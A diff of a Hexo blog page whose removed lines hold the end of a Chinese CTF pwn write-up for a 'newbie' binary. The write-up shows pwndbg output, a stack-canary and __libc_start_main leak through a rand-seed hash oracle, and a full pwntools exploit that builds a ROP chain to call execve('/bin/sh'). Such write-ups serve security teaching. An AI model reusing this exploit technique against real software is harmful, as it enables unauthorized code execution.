-<p>我们可以用泄露canary的方式来泄露“__libc_start_main”（就是有一点麻烦）</p>
-<p>先在pwndbg中看”buf[0]”的数据：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x9bf0</span></span><br><span class="line"> RBX  <span class="number">0x555555400e10</span> ◂— push   r15</span><br><span class="line"> RCX  <span class="number">0xffffffc0</span></span><br><span class="line"> RDX  <span class="number">0x6</span></span><br><span class="line">*RDI  <span class="number">0x9bf0</span></span><br><span class="line"> RSI  <span class="number">0x555555400f09</span> ◂— movsxd rsi, dword ptr [rdx + <span class="number">0x65</span>] /* <span class="string">&#x27;create&#x27;</span> */</span><br><span class="line"> R8   <span class="number">0x2</span></span><br><span class="line"> R9   <span class="number">0x2</span></span><br><span class="line"> R10  <span class="number">0x555555400f02</span> ◂— <span class="keyword">and</span>    byte ptr ds:[rax], al /* <span class="string">&#x27;&gt; &#x27;</span> */</span><br><span class="line"> R11  <span class="number">0x6</span></span><br><span class="line"> R12  <span class="number">0x5555554009c0</span> ◂— xor    ebp, ebp</span><br><span class="line"> R13  <span class="number">0x7fffffffde00</span> ◂— <span class="number">0x1</span></span><br><span class="line"> R14  <span class="number">0x0</span></span><br><span class="line"> R15  <span class="number">0x0</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffdcf0</span> —▸ <span class="number">0x7fffffffdd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdc70</span> ◂— <span class="number">0xd68</span> /* <span class="string">&#x27;h\r&#x27;</span> */</span><br><span class="line">*RIP  <span class="number">0x555555400d80</span> ◂— call   <span class="number">0x555555400bd1</span></span><br></pre></td></tr></table></figure>
-<p>搜索一下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t word <span class="number">0x9bf0</span></span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7fa54e0</span> <span class="number">0xf5fff69bf0</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdc86</span> <span class="number">0x9260245d5a0d9bf0</span></span><br></pre></td></tr></table></figure>
-<p>然后不知道从哪里掏出来“main”的返回地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>   <span class="number">0x555555400d80</span></span><br><span class="line">  f <span class="number">1</span>   <span class="number">0x555555400dfe</span></span><br><span class="line">  f <span class="number">2</span>   <span class="number">0x7ffff7dea0b3</span> __libc_start_main+<span class="number">243</span></span><br></pre></td></tr></table></figure>
-<p>搜索一下这个地址，就得到了存放“返回地址”的地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t qword <span class="number">0x7ffff7dea0b3</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdd18</span> <span class="number">0x7ffff7dea0b3</span></span><br></pre></td></tr></table></figure>
-<p>两者相减计算偏移：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd18</span> - <span class="number">0x7fffffffdc86</span> = <span class="number">146</span></span><br><span class="line"><span class="number">146</span> / <span class="number">2</span> = <span class="number">73</span></span><br></pre></td></tr></table></figure>
-<p>放入刚刚的模块中“__libc_start_main”的地址就有了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main))</span><br></pre></td></tr></table></figure>
-<p>最后可以用“one_gadget”来打</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4f3d5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x4f432</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x40</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x40</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x10a41c</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
-<p>完整exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line"><span class="keyword">import</span> ctypes </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./newbie&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">hashes = &#123;&#125;</span><br><span class="line">stack_canary_offset = <span class="number">49</span></span><br><span class="line">stack_libc_start_main_offset = <span class="number">73</span></span><br><span class="line">charset = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;id &#x27;</span> + <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your key: &#x27;</span>)</span><br><span class="line">    key = p.recvline().strip().decode()</span><br><span class="line">    value = hashes[key]</span><br><span class="line">    <span class="comment"># Correct for the 1 and 0 collision.</span></span><br><span class="line">    <span class="keyword">if</span> value == <span class="number">1</span>:</span><br><span class="line">        value = <span class="number">0</span></span><br><span class="line">    log.info(<span class="string">&#x27;Offset &#123;&#125;: &#123;&#125; (&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(offset, key, <span class="built_in">hex</span>(value)))</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">precompute</span>():</span></span><br><span class="line">    libc = ctypes.cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">    <span class="keyword">global</span> hashes</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffff</span>+<span class="number">1</span>):</span><br><span class="line">        libc.srand(i)</span><br><span class="line">        val = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            val += charset[libc.rand() % <span class="built_in">len</span>(charset)]</span><br><span class="line">        hashes[val] = i</span><br><span class="line">    log.info(<span class="string">&quot;Computed &#123;&#125; hashes.&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(hashes)))</span><br><span class="line"></span><br><span class="line">precompute()</span><br><span class="line"></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	canary+=(leak(stack_canary_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">__libc_start_main = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	__libc_start_main+=(leak(stack_libc_start_main_offset + i))&lt;&lt;(<span class="number">16</span>*i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__libc_start_main &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(__libc_start_main-<span class="number">243</span>))</span><br><span class="line"></span><br><span class="line">libc_start_main_offset = libc.libc_start_main_return</span><br><span class="line">libc_base=__libc_start_main-libc_start_main_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">poprdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">poprsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">poprdx_poprbx_ret=libc_base+<span class="number">0x0000000000162866</span></span><br><span class="line">binsh_libc=libc_base+<span class="number">0x00000000001b75aa</span></span><br><span class="line">execve_libc=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;execve &gt;&gt; &#x27;</span> +<span class="built_in">hex</span>(execve_libc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi_ret)+p64(binsh_libc)</span><br><span class="line">payload+=p64(poprsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprdx_poprbx_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(execve_libc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>参考： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43921239/article/details/105318835">pwn题查找字符串方法记录</a></p>
-<hr>
-<p><strong>PS：</strong></p>
-<p>我这个libc版本打不了“one_gadget”，只能自己凑了</p>
-<p>还有一个问题：用system打不通，但execve一下子就通了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1815,7 +1770,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">301</span>
+          <span class="site-state-item-count">302</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1869,7 +1824,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">64:18</span>
+    <span title="Reading time total">64:21</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
